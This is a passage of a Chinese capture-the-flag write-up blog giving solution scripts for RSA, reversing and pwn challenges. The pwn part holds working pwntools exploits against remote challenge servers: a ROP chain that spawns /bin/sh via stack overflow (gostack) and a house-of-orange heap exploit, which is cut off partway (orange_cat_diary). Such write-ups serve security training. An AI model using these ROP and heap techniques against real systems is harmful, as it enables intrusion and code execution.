class="number">111922722351752356094117957341697336848130397712588425954225300832977768690114834703654895285440684751636198779555891692340301590396539921700125219784729325979197290342352480495970455903120265334661588516182848933843212275742914269686197484648288073599387074325226321407600351615258973610780463417788580083967</span></span><br><span class="line">e = <span class="number">37059679294843322451875129178470872595128216054082068877693632035071251762179299783152435312052608685562859680569924924133175684413544051218945466380415013172416093939670064185752780945383069447693745538721548393982857225386614608359109463927663728739248286686902750649766277564516226052064304547032760477638585302695605907950461140971727150383104</span></span><br><span class="line">c = <span class="number">14999622534973796113769052025256345914577762432817016713135991450161695032250733213228587506601968633155119211807176051329626895125610484405486794783282214597165875393081405999090879096563311452831794796859427268724737377560053552626220191435015101496941337770496898383092414492348672126813183368337602023823</span></span><br><span class="line"></span><br><span class="line">k = e // n - <span class="number">2</span></span><br><span class="line">tmp = <span class="number">65537</span> + (k+<span class="number">2</span>)*n + (k+<span class="number">2</span>)+<span class="number">1</span></span><br><span class="line">R.&lt;x&gt; = PolynomialRing(RealField(<span class="number">1024</span>))</span><br><span class="line">f = e*x - (<span class="number">2</span>*(k+<span class="number">1</span>)*x^<span class="number">2</span> + (k+<span class="number">2</span>)*n + tmp*x)</span><br><span class="line">res = f.roots()</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> root <span class="keyword">in</span> res:</span><br><span class="line">    p_high = <span class="built_in">int</span>(root[<span class="number">0</span>])</span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    f1 = x + p_high</span><br><span class="line">    roots = f1.monic().small_roots(X=<span class="number">2</span>^<span class="number">200</span>,beta=<span class="number">0.4</span>)</span><br><span class="line">    <span class="keyword">if</span> roots:</span><br><span class="line">        p = <span class="built_in">int</span>(roots[<span class="number">0</span>]) + p_high</span><br><span class="line">        q = n // p</span><br><span class="line">        e = <span class="number">65537</span> + k * p + (k+<span class="number">2</span>) * ((p+<span class="number">1</span>) * (q+<span class="number">1</span>)) + <span class="number">1</span></span><br><span class="line">        d = inverse(e,(p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br><span class="line">        m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br></pre></td></tr></table></figure><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519153140820-1858714848.png" alt="image-20240519153128716"></p><h2 id="古典密文">古典密文</h2><p><img src="https://img2023.cnblogs.com/blog/3051266/202405/3051266-20240519153315904-1153606556.png" alt="image-20240519153310923"></p><h1>Reverse</h1><h2 id="asm-re">asm_re</h2><p>一开始还想还原这个ida工程文件hhh，发现根本做不到，后面纯看arm汇编代码，直接手撕就好，加密逻辑在这儿，密文一开始还找半天，后面发现应该是存在变量unk_100003F10里面<br><img src="https://cdn.nlark.com/yuque/0/2024/png/44199706/1716107133474-6dd6bd70-f747-4e79-82d0-bd71353915ef.png#averageHue=%23302c2a&amp;clientId=udceba6e2-2876-4&amp;from=paste&amp;height=273&amp;id=ufa235f5b&amp;originHeight=341&amp;originWidth=1106&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=47929&amp;status=done&amp;style=none&amp;taskId=u632123d7-babc-4de8-b5f9-4bbaab5c3b8&amp;title=&amp;width=884.8" alt="image.png"></p><p>搓出脚本之后也还是卡了一小会儿，最后反应过来大小端的问题，改一下小端就好了，爆破一下直接出<br>exp:</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">k = [</span><br><span class="line">    <span class="number">0x1fd7</span>, <span class="number">0x21b7</span>, <span class="number">0x1e47</span>, <span class="number">0x2027</span>, <span class="number">0x26e7</span>, <span class="number">0x10d7</span>, <span class="number">0x1127</span>, <span class="number">0x2007</span>,</span><br><span class="line">    <span class="number">0x11c7</span>, <span class="number">0x1e47</span>, <span class="number">0x1017</span>, <span class="number">0x1017</span>, <span class="number">0x11f7</span>, <span class="number">0x2007</span>, <span class="number">0x1037</span>, <span class="number">0x1107</span>,</span><br><span class="line">    <span class="number">0x1f17</span>, <span class="number">0x10d7</span>, <span class="number">0x1017</span>, <span class="number">0x1017</span>, <span class="number">0x1f67</span>, <span class="number">0x1017</span>, <span class="number">0x11c7</span>, <span class="number">0x11c7</span>,</span><br><span class="line">    <span class="number">0x1017</span>, <span class="number">0x1fd7</span>, <span class="number">0x1f17</span>, <span class="number">0x1107</span>, <span class="number">0x0f47</span>, <span class="number">0x1127</span>, <span class="number">0x1037</span>, <span class="number">0x1e47</span>,</span><br><span class="line">    <span class="number">0x1037</span>, <span class="number">0x1fd7</span>, <span class="number">0x1107</span>, <span class="number">0x1fd7</span>, <span class="number">0x1107</span>, <span class="number">0x2787</span></span><br><span class="line">]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(k)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">128</span>): </span><br><span class="line">        <span class="keyword">if</span> (((j * <span class="built_in">ord</span>(<span class="string">&#x27;P&#x27;</span>) + <span class="number">0x14</span>) ^ <span class="built_in">ord</span>(<span class="string">&#x27;M&#x27;</span>)) + <span class="number">0x1e</span>) == k[i]:</span><br><span class="line">            <span class="built_in">print</span>(<span class="built_in">chr</span>(j), end=<span class="string">&quot;&quot;</span>) </span><br><span class="line"><span class="comment">#flag&#123;67e9a228e45b622c2992fb5174a4f5f5&#125;</span></span><br></pre></td></tr></table></figure><h2 id="whereThel1b">whereThel1b</h2><p>还真是第一次遇见这种，给了个so和一个py文件，一开始的想法是能不能给so解包之类的，因为py文件里面密文给了，就差一个加密逻辑，找了一大圈还是没找到，最后还是想到了调一下so文件，像调安卓那样<br>动调起来锁定出了两个函数，得知输入的数据先经过base64编码之后再进行的异或<img src="https://cdn.nlark.com/yuque/0/2024/png/44199706/1716109884779-17e06c83-6fc5-4814-bd3c-48dc2b4e2d3b.png#averageHue=%23bff8fb&amp;clientId=udceba6e2-2876-4&amp;from=paste&amp;height=158&amp;id=u3e8cb98a&amp;originHeight=197&amp;originWidth=863&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=26226&amp;status=done&amp;style=none&amp;taskId=u35d4d91b-bb47-4e0d-820f-1198f5bce0c&amp;title=&amp;width=690.4" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2024/png/44199706/1716109932327-1f17bb8d-f10b-4e67-b587-873ccedb086b.png#averageHue=%23c0f9fc&amp;clientId=udceba6e2-2876-4&amp;from=paste&amp;height=153&amp;id=u8cca14f4&amp;originHeight=191&amp;originWidth=472&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=12594&amp;status=done&amp;style=none&amp;taskId=u35d995fb-98a6-4327-9277-5d0144be3a2&amp;title=&amp;width=377.6" alt="image.png"><br>加密逻辑知道了，但是不知道异或的值是什么，一开始以为是存在r18里面的，最后调了一下找不到规律，最后想到重新写一份密文输入，然后把加密之后的数据输出一下，前后异或得到所需异或的值，想办法输入一个输构造出经过base64编码之后长度为56的数<br><img src="https://cdn.nlark.com/yuque/0/2024/png/44199706/1716110117071-af6369b0-a2ff-4e9b-a55e-3bb343104144.png#averageHue=%23533272&amp;clientId=udceba6e2-2876-4&amp;from=paste&amp;height=225&amp;id=uc5ca83a7&amp;originHeight=281&amp;originWidth=586&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=32753&amp;status=done&amp;style=none&amp;taskId=u021a7de5-9bc0-4032-b65f-eb37a4f769e&amp;title=&amp;width=468.8" alt="image.png"><br>exp:<br>其中aa是上图构造的“55555555555555555555555555555555555555555555”的base64之后的值，然后bb是运行上图之后得到的异或之后的值，最后运行出来的结果解一下base64就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">encry = [<span class="number">108</span>, <span class="number">117</span>, <span class="number">72</span>, <span class="number">80</span>, <span class="number">64</span>, <span class="number">49</span>, <span class="number">99</span>, <span class="number">19</span>, <span class="number">69</span>, <span class="number">115</span>, <span class="number">94</span>, <span class="number">93</span>, <span class="number">94</span>, <span class="number">115</span>, <span class="number">71</span>, <span class="number">95</span>, <span class="number">84</span>, <span class="number">89</span>, <span class="number">56</span>, <span class="number">101</span>, <span class="number">70</span>, <span class="number">2</span>, <span class="number">84</span>, <span class="number">75</span>, <span class="number">127</span>, <span class="number">68</span>, <span class="number">103</span>, <span class="number">85</span>, <span class="number">105</span>, <span class="number">113</span>, <span class="number">80</span>, <span class="number">103</span>, <span class="number">95</span>, <span class="number">67</span>, <span class="number">81</span>, <span class="number">7</span>, <span class="number">113</span>, <span class="number">70</span>, <span class="number">47</span>, <span class="number">73</span>, <span class="number">92</span>, <span class="number">124</span>, <span class="number">93</span>, <span class="number">120</span>, <span class="number">104</span>, <span class="number">108</span>, <span class="number">106</span>, <span class="number">17</span>, <span class="number">80</span>, <span class="number">102</span>, <span class="number">101</span>, <span class="number">75</span>, <span class="number">93</span>, <span class="number">68</span>, <span class="number">121</span>, <span class="number">26</span>]</span><br><span class="line"></span><br><span class="line">aa = [<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>,<span class="number">78</span>,<span class="number">84</span>,<span class="number">85</span>,<span class="number">49</span>]</span><br><span class="line">bb = [<span class="number">120</span>, <span class="number">76</span>, <span class="number">101</span>, <span class="number">9</span>, <span class="number">84</span>, <span class="number">86</span>, <span class="number">69</span>, <span class="number">17</span>, <span class="number">81</span>, <span class="number">77</span>, <span class="number">103</span>, <span class="number">4</span>, <span class="number">93</span>, <span class="number">74</span>, <span class="number">67</span>, <span class="number">20</span>, <span class="number">67</span>, <span class="number">116</span>, <span class="number">93</span>, <span class="number">35</span>, <span class="number">70</span>, <span class="number">100</span>, <span class="number">83</span>, <span class="number">22</span>, <span class="number">125</span>, <span class="number">68</span>, <span class="number">119</span>, <span class="number">28</span>, <span class="number">125</span>, <span class="number">114</span>, <span class="number">92</span>, <span class="number">34</span>, <span class="number">72</span>, <span class="number">122</span>, <span class="number">81</span>, <span class="number">7</span>, <span class="number">101</span>, <span class="number">65</span>, <span class="number">75</span>, <span class="number">18</span>, <span class="number">72</span>, <span class="number">66</span>, <span class="number">78</span>, <span class="number">37</span>, <span class="number">105</span>, <span class="number">124</span>, <span class="number">88</span>, <span class="number">18</span>, <span class="number">80</span>, <span class="number">72</span>, <span class="number">98</span>, <span class="number">16</span>, <span class="number">94</span>, <span class="number">87</span>, <span class="number">102</span>, <span class="number">18</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(aa)):</span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">chr</span>(((aa[i]^bb[i]))^encry[i]),end=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="comment">#ZmxhZ3s3ZjlhMmQzYy0wN2RlLTExZWYtYmU1ZS1jZjFlODg2NzRjMGJ9</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2024/png/44199706/1716110388906-19b8d9e8-944d-4754-abc1-bb32539cf928.png#averageHue=%23fbfafa&amp;clientId=udceba6e2-2876-4&amp;from=paste&amp;height=321&amp;id=u21ca8627&amp;originHeight=401&amp;originWidth=1001&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=29873&amp;status=done&amp;style=none&amp;taskId=u57d8f6b1-9320-4cba-8df7-3614d3a13ff&amp;title=&amp;width=800.8" alt="image.png"></p><h2 id="gdb-debug">gdb_debug</h2><p>进入主函数之后逻辑还是相当清楚的，锁定了一下伪随机数<br><img src="https://cdn.nlark.com/yuque/0/2024/png/44199706/1716108171134-d0c78cae-29d9-40d8-98cb-2cc66768bf09.png#averageHue=%23c6fbfe&amp;clientId=udceba6e2-2876-4&amp;from=paste&amp;height=30&amp;id=u86f42e8a&amp;originHeight=37&amp;originWidth=279&amp;originalType=binary&amp;ratio=1.25&amp;rotation=0&amp;showTitle=false&amp;size=1960&amp;status=done&amp;style=none&amp;taskId=uc34bcd71-5b39-4a72-8912-972a5d90723&amp;title=&amp;width=223.2" alt="image.png"><br>动调跑起来取出随机数</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0xd9</span>, <span class="number">0x0f</span>, <span class="number">0x18</span>, <span class="number">0xBD</span>, <span class="number">0xC7</span>, <span class="number">0x16</span>, <span class="number">0x81</span>, <span class="number">0xbe</span>, <span class="number">0xf8</span>, <span class="number">0x4A</span>, <span class="number">0x65</span>, <span class="number">0xf2</span>, <span class="number">0x5D</span>, <span class="number">0xab</span>, <span class="number">0x74</span>, <span class="number">0x33</span>, <span class="number">0xd4</span>, <span class="number">0xa5</span>, <span class="number">0x67</span>, <span class="number">0x98</span>, <span class="number">0x9f</span>, <span class="number">0x7E</span>, <span class="number">0x2B</span>, <span class="number">0x5D</span>, <span class="number">0xc2</span>, <span class="number">0xaf</span>, <span class="number">0x8e</span>, <span class="number">0x3A</span>, <span class="number">0x4C</span>, <span class="number">0xa5</span>, <span class="number">0X75</span>, <span class="number">0X25</span>, <span class="number">0xb4</span>, <span class="number">0x8d</span>, <span class="number">0xe3</span>, <span class="number">0X7B</span>, <span class="number">0xa3</span>, <span class="number">0x64</span></span><br></pre></td></tr></table></figure><p>然后直接从后往前逆就好<br>exp:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> indexArray[<span class="number">38</span>];</span><br><span class="line">    <span class="type">int</span> buffer[<span class="number">38</span>];</span><br><span class="line">    <span class="type">int</span> outputBuffer[<span class="number">38</span>];</span><br><span class="line">    <span class="type">int</span> originalNumbers[] = &#123;</span><br><span class="line">        <span class="number">94</span>, <span class="number">30</span>, <span class="number">2</span>, <span class="number">68</span>, <span class="number">157</span>, <span class="number">32</span>, <span class="number">134</span>, <span class="number">99</span>, <span class="number">227</span>, <span class="number">214</span>,</span><br><span class="line">        <span class="number">182</span>, <span class="number">105</span>, <span class="number">24</span>, <span class="number">193</span>, <span class="number">153</span>, <span class="number">168</span>, <span class="number">188</span>, <span class="number">5</span>, <span class="number">121</span>, <span class="number">159</span>,</span><br><span class="line">        <span class="number">25</span>, <span class="number">110</span>, <span class="number">218</span>, <span class="number">76</span>, <span class="number">117</span>, <span class="number">174</span>, <span class="number">192</span>, <span class="number">185</span>, <span class="number">247</span>, <span class="number">122</span>,</span><br><span class="line">        <span class="number">149</span>, <span class="number">77</span>, <span class="number">23</span>, <span class="number">135</span>, <span class="number">148</span>, <span class="number">84</span>, <span class="number">191</span>, <span class="number">185</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> byteSequence[] = &#123;</span><br><span class="line">        <span class="number">128</span>, <span class="number">180</span>, <span class="number">64</span>, <span class="number">184</span>, <span class="number">148</span>, <span class="number">200</span>, <span class="number">52</span>, <span class="number">101</span>, <span class="number">238</span>, <span class="number">69</span>,</span><br><span class="line">        <span class="number">215</span>, <span class="number">157</span>, <span class="number">60</span>, <span class="number">136</span>, <span class="number">140</span>, <span class="number">169</span>, <span class="number">107</span>, <span class="number">174</span>, <span class="number">125</span>, <span class="number">135</span>,</span><br><span class="line">        <span class="number">214</span>, <span class="number">135</span>, <span class="number">15</span>, <span class="number">218</span>, <span class="number">70</span>, <span class="number">100</span>, <span class="number">57</span>, <span class="number">147</span>, <span class="number">169</span>, <span class="number">144</span>,</span><br><span class="line">        <span class="number">184</span>, <span class="number">113</span>, <span class="number">131</span>, <span class="number">232</span>, <span class="number">172</span>, <span class="number">201</span>, <span class="number">231</span>, <span class="number">83</span></span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> shuffledIndices[<span class="number">38</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">38</span>; i++) &#123;</span><br><span class="line">        shuffledIndices[i] = originalNumbers[i] ^ byteSequence[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">int</span> encryptionKeys[] = &#123;<span class="number">0xd9</span>, <span class="number">0x0f</span>, <span class="number">0x18</span>, <span class="number">0xBD</span>, <span class="number">0xC7</span>, <span class="number">0x16</span>, <span class="number">0x81</span>, <span class="number">0xbe</span>, <span class="number">0xf8</span>, <span class="number">0x4A</span>, <span class="number">0x65</span>, <span class="number">0xf2</span>, <span class="number">0x5D</span>, <span class="number">0xab</span>, <span class="number">0x74</span>, <span class="number">0x33</span>, <span class="number">0xd4</span>, <span class="number">0xa5</span>, <span class="number">0x67</span>, <span class="number">0x98</span>, <span class="number">0x9f</span>, <span class="number">0x7E</span>, <span class="number">0x2B</span>, <span class="number">0x5D</span>, <span class="number">0xc2</span>, <span class="number">0xaf</span>, <span class="number">0x8e</span>, <span class="number">0x3A</span>, <span class="number">0x4C</span>, <span class="number">0xa5</span>, <span class="number">0x75</span>, <span class="number">0x25</span>, <span class="number">0xb4</span>, <span class="number">0x8d</span>, <span class="number">0xe3</span>, <span class="number">0x7B</span>, <span class="number">0xa3</span>, <span class="number">0x64</span>&#125;;</span><br><span class="line">    <span class="type">int</span> permutationOrder[] = &#123;<span class="number">33</span>, <span class="number">0</span>, <span class="number">10</span>, <span class="number">0</span>, <span class="number">32</span>, <span class="number">31</span>, <span class="number">10</span>, <span class="number">29</span>, <span class="number">9</span>, <span class="number">24</span>, <span class="number">26</span>, <span class="number">11</span>, <span class="number">20</span>, <span class="number">24</span>, <span class="number">21</span>, <span class="number">3</span>, <span class="number">12</span>, <span class="number">10</span>, <span class="number">13</span>, <span class="number">2</span>, <span class="number">15</span>, <span class="number">4</span>, <span class="number">13</span>, <span class="number">10</span>, <span class="number">8</span>, <span class="number">3</span>, <span class="number">3</span>, <span class="number">6</span>, <span class="number">0</span>, <span class="number">4</span>, <span class="number">1</span>, <span class="number">1</span>, <span class="number">5</span>, <span class="number">4</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>&#125;;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> dataXor[] = &#123;<span class="number">0xBF</span>, <span class="number">0xD7</span>, <span class="number">0x2E</span>, <span class="number">0xDA</span>, <span class="number">0xEE</span>, <span class="number">0xA8</span>, <span class="number">0x1A</span>, <span class="number">0x10</span>, <span class="number">0x83</span>, <span class="number">0x73</span>, <span class="number">0xAC</span>, <span class="number">0xF1</span>, <span class="number">0x06</span>, <span class="number">0xBE</span>, <span class="number">0xAD</span>, <span class="number">0x88</span>, <span class="number">0x04</span>, <span class="number">0xD7</span>, <span class="number">0x12</span>, <span class="number">0xFE</span>, <span class="number">0xB5</span>, <span class="number">0xE2</span>, <span class="number">0x61</span>, <span class="number">0xB7</span>, <span class="number">0x3D</span>, <span class="number">0x07</span>, <span class="number">0x4A</span>, <span class="number">0xE8</span>, <span class="number">0x96</span>, <span class="number">0xA2</span>, <span class="number">0x9D</span>, <span class="number">0x4D</span>, <span class="number">0xBC</span>, <span class="number">0x81</span>, <span class="number">0x8C</span>, <span class="number">0xE9</span>, <span class="number">0x88</span>, <span class="number">0x78</span>&#125;;</span><br><span class="line">    <span class="type">char</span> inputData[] = <span class="string">&quot;congratulationstoyoucongratulationstoy&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">38</span>; i++) &#123;</span><br><span class="line">        indexArray[i] = i;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> k = <span class="number">37</span>; k &gt; <span class="number">0</span>; --k) &#123;</span><br><span class="line">        <span class="type">int</span> swapIndex = permutationOrder[<span class="number">37</span> - k] % (k + <span class="number">1</span>);</span><br><span class="line">        <span class="type">int</span> tempIndex = indexArray[k];</span><br><span class="line">        indexArray[k] = indexArray[swapIndex];</span><br><span class="line">        indexArray[swapIndex] = tempIndex;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">38</span>; i++) &#123;</span><br><span class="line">        buffer[i] = shuffledIndices[i] ^ inputData[i] ^ dataXor[i];</span><br><span class="line">        outputBuffer[indexArray[i]] = encryptionKeys[indexArray[i]] ^ buffer[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">38</span>; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%c&quot;</span>, outputBuffer[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h1>Pwn</h1><h2 id="gostack">gostack</h2><p>IDA8.3补全符号表，开了个NX，不影响打栈溢出</p><ul><li>exp</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding=utf-8 -*</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> LibcSearcher <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">&quot;8.147.133.63&quot;</span>, <span class="number">17147</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./gostack&#x27;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line">syscall = <span class="number">0x404043</span></span><br><span class="line">rax_ret = <span class="number">0x40f984</span></span><br><span class="line">rdi_ret = <span class="number">0x4a18a5</span></span><br><span class="line">rsi_ret = <span class="number">0x42138a</span></span><br><span class="line">rdx_ret = <span class="number">0x4944ec</span></span><br><span class="line">p.recvuntil(<span class="string">&#x27;message :&#x27;</span>)</span><br><span class="line">payload = <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x100</span> + p64(elf.bss()) + p64(<span class="number">0x10</span>) + p64(<span class="number">0</span>) * <span class="number">0x18</span></span><br><span class="line">payload += p64(rdi_ret) + p64(<span class="number">0</span>) * <span class="number">6</span> + p64(rsi_ret) + p64(elf.bss() + <span class="number">0x200</span>) + p64(rdx_ret) + p64(<span class="number">0x100</span>) + p64(rax_ret) + p64(<span class="number">0</span>) + p64(syscall)</span><br><span class="line">payload += p64(rdi_ret) + p64(elf.bss() + <span class="number">0x200</span>) + p64(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">payload += p64(rdi_ret) + p64(elf.bss() + <span class="number">0x200</span>) + p64(<span class="number">0</span>) * <span class="number">5</span></span><br><span class="line">payload += p64(rdi_ret) + p64(elf.bss() + <span class="number">0x200</span>) + p64(<span class="number">0</span>) * <span class="number">5</span> + p64(rsi_ret) + p64(<span class="number">0</span>) + p64(rdx_ret) + p64(<span class="number">0</span>) + p64(rax_ret) + p64(<span class="number">59</span>) + p64(syscall)</span><br><span class="line">p.sendline(payload)</span><br><span class="line"><span class="built_in">input</span>()</span><br><span class="line">p.send(<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="orange-cat-diar">orange_cat_diar</h2><p>有个UAF</p><p><img src="https://img2023.cnblogs.com/blog/3051266/202406/3051266-20240607114611892-716076837.png" alt="image-20240607114610173"></p><p>然后就是house of orange，打unsorted bin attack泄露libc基址，然后改malloc_hook</p><ul><li>exp</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment"># p=process(&#x27;./orange_cat_diary&#x27;)</span></span><br><span class="line">p = remote(<span class="string">&#x27;8.147.128.251&#x27;</span>, <span class="number">17907</span>)</span><br><span class="line">libc = ELF(<span class="string">&#x27;./libc-2.23.so&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">choice</span>(<span class="params">i</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="built_in">str</span>(i))</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">add</span>(<span class="params">size, content</span>):</span><br><span class="line">    choice(<span class="number">1</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;content:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:&#x27;</span>, content)</span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">size, content</span>):</span><br><span class="line">    choice(<span class="number">4</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;content:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;content:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&#x27;name.&#x27;</span>, <span class="string">&#x27;rweb&#x27;</span>)</span><br><span class="line">add(<span class="number">0x68</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">edit(<span class="number">0x70</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">0x68</span> + p64(<span class="number">0x0f91</span>))</span><br><span class="line">add(<span class="number">0x1000</span>, <span class="string">b&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="number">0x18</span>, <span class="string">b&#x27;a&#x27;</span> * <span class="number">8</span>)</span><br><span 